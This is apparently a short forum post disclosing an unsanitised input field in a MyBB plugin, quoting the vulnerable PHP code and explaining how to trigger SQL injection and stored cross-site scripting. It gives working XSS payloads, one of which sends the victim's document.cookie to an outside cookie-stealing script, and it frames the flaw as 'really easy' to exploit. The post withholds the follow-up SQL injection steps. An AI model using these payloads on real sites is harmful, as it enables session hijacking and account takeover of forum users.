
This a really easy one to exploit, user input is not sanitized at all and so is injected into the database as the following lines:

if (isset($mybb->input['xli']))
   {
      $xli->user_update_data['xli'] = $mybb->input['xli'];
   }

As you can see, no use of sanitation functions like - mysql_real_escape_string() or htmlentities()

To trigger the SQLi error simply enter the standard ' or for XSS enter your code e.g.

<script>alert(document.cookie);</script>

or

<script>window.open("http://webcite.com/cookiesteal.php?cookie"+document.cookie);</script>


Im not going to show step by step Post SQLi
